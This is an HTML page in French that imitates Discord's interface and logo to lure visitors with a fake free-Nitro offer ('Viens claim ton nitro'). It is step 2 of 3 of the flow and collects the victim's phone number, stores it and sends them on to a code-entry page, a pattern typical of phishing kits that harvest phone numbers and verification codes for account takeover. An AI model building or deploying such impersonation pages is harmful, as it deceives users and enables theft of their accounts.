<head>

<!-- General -->
<meta name="description" content="Viens claim ton nitro">

<link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #313338;
    font-family: 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
    padding: 1.5rem;
  }

  body::before, body::after {
    content: '';
    position: fixed;
    border-radius: 50%;
    z-index: 0;
    pointer-events: none;
  }
  body::before {
    width: 600px; height: 600px;
    background: radial-gradient(circle, #5865f230 0%, transparent 70%);
    top: -150px; left: -150px;
  }
  body::after {
    width: 500px; height: 500px;
    background: radial-gradient(circle, #eb459e20 0%, transparent 70%);
    bottom: -100px; right: -100px;
  }

  .card {
    background: #2b2d31;
    border-radius: 4px;
    padding: 2rem 2rem 1.5rem;
    width: 100%;
    max-width: 480px;
    position: relative;
    z-index: 1;
    animation: fadeUp 0.3s ease;
    box-shadow: 0 8px 32px rgba(0,0,0,0.5);
  }

  @keyframes fadeUp {
    from { opacity: 0; transform: translateY(12px); }
    to   { opacity: 1; transform: translateY(0); }
  }

  .logo {
    display: flex;
    justify-content: center;
    margin-bottom: 1rem;
  }
  .logo svg { width: 48px; height: 48px; }

  .card-title {
    font-size: 24px;
    font-weight: 700;
    color: #f2f3f5;
    text-align: center;
    margin-bottom: 0.25rem;
    letter-spacing: -0.3px;
  }

  .card-sub {
    font-size: 14px;
    color: #b5bac1;
    text-align: center;
    margin-bottom: 1.5rem;
  }

  .progress-wrap {
    display: flex;
    align-items: center;
    gap: 6px;
    margin-bottom: 1.5rem;
  }

  .progress-wrap span {
    flex: 1;
    height: 4px;
    border-radius: 99px;
    background: #3b3d44;
  }

  .progress-wrap span.done { background: #5865f2; }

  .progress-label {
    font-size: 11px;
    color: #b5bac1;
    text-align: right;
    margin-bottom: 0.75rem;
    margin-top: -1rem;
    letter-spacing: 0.03em;
    text-transform: uppercase;
    font-weight: 700;
  }

  .field { margin-bottom: 1rem; }

  .field label {
    display: block;
    font-size: 12px;
    font-weight: 700;
    color: #b5bac1;
    text-transform: uppercase;
    letter-spacing: 0.04em;
    margin-bottom: 6px;
  }

  .field label .req { color: #ed4245; margin-left: 2px; }

  .phone-row { display: flex; gap: 8px; }

  .indicatif {
    width: 72px;
    padding: 10px 8px;
    font-size: 16px;
    font-family: inherit;
    background: #1e1f22;
    border: 1px solid #1e1f22;
    border-radius: 3px;
    color: #dbdee1;
    outline: none;
    text-align: center;
    transition: border-color 0.15s;
    -moz-appearance: textfield;
    appearance: textfield;
  }

  .indicatif:focus { border-color: #5865f2; }

  .indicatif::-webkit-outer-spin-button,
  .indicatif::-webkit-inner-spin-button {
    -webkit-appearance: none;
    appearance: none;
  }

  .phone-input {
    flex: 1;
    padding: 10px 12px;
    font-size: 16px;
    font-family: inherit;
    background: #1e1f22;
    border: 1px solid #1e1f22;
    border-radius: 3px;
    color: #dbdee1;
    outline: none;
    letter-spacing: 0.04em;
    transition: border-color 0.15s;
  }

  .phone-input::placeholder { color: #4e5058; }
  .phone-input:focus { border-color: #5865f2; }

  .hint {
    font-size: 12px;
    color: #72767d;
    margin-top: 6px;
    display: block;
  }

  .error-msg {
    display: block;
    font-size: 12px;
    font-style: italic;
    color: #ed4245;
    margin-top: 5px;
    min-height: 16px;
  }

  .btn-row { display: flex; gap: 8px; margin-top: 1.25rem; }

  .btn-back {
    padding: 11px 16px;
    font-size: 14px;
    font-family: inherit;
    font-weight: 500;
    background: transparent;
    border: 1px solid #4e5058;
    border-radius: 3px;
    color: #b5bac1;
    cursor: pointer;
    transition: background 0.15s;
    white-space: nowrap;
  }

  .btn-back:hover { background: #3b3d44; }

  .btn-submit {
    flex: 1;
    padding: 11px;
    font-size: 16px;
    font-family: inherit;
    font-weight: 500;
    background: #5865f2;
    border: none;
    border-radius: 3px;
    color: #fff;
    cursor: pointer;
    transition: background 0.15s, transform 0.1s;
  }

  .btn-submit:hover { background: #4752c4; }
  .btn-submit:active { transform: scale(0.99); }

  .divider {
    border: none;
    border-top: 1px solid #3b3d44;
    margin: 1.25rem 0 1rem;
  }

  .footer-link { font-size: 14px; color: #b5bac1; }
  .footer-link a { color: #00a8fc; text-decoration: none; }
  .footer-link a:hover { text-decoration: underline; }
</style>
</head>
<body>

<div class="card">

  <div class="logo">
    <svg viewBox="0 0 127.14 96.36" xmlns="http://www.w3.org/2000/svg">
      <path fill="#5865f2" d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/>
    </svg>
  </div>

  <h1 class="card-title">Numéro de téléphone</h1>
  <p class="card-sub">On t'enverra un code pour vérifier ton numéro.</p>

  <div class="progress-wrap">
    <span class="done"></span>
    <span class="done"></span>
    <span></span>
  </div>
  <p class="progress-label">Étape 2 sur 3</p>

  <div class="field">
    <label>Téléphone <span class="req">*</span></label>
    <div class="phone-row">
      <input class="indicatif" type="text" id="indicatif" value="+33" maxlength="5" placeholder="+33">
      <input class="phone-input" type="tel" id="phone" placeholder="6 12 34 56 78" maxlength="14" autocomplete="tel">
    </div>
    <span class="hint">Format : 06 ou 07 pour la France</span>
    <span class="error-msg" id="err"></span>
  </div>

  <div class="btn-row">
    <button class="btn-back" onclick="window.location.href='index.html'">← Retour</button>
    <button class="btn-submit" onclick="goNext()">Envoyer le code</button>
  </div>

  <hr class="divider">

  <p class="footer-link">Tu as déjà un compte ? <a href="#">Se connecter</a></p>

</div>

<script>
  const phoneInput = document.getElementById('phone');
  const err        = document.getElementById('err');

  phoneInput.addEventListener('input', () => {
    phoneInput.value = phoneInput.value.replace(/[^0-9 \-]/g, '');
  });

  phoneInput.addEventListener('keydown', e => { if (e.key === 'Enter') goNext(); });

  function goNext() {
    const indic = document.getElementById('indicatif').value.trim();
    const raw   = phoneInput.value.replace(/\s|-/g, '').trim();
    if (!raw) { err.textContent = 'Ce champ est requis.'; return; }
    if (!/^\d{9,10}$/.test(raw)) { err.textContent = 'Numéro invalide — 9 ou 10 chiffres attendus.'; return; }
    err.textContent = '';
    sessionStorage.setItem('phone', indic + ' ' + phoneInput.value.trim());
    window.location.href = 'code.html';
  }
</script>

</body>
</html>
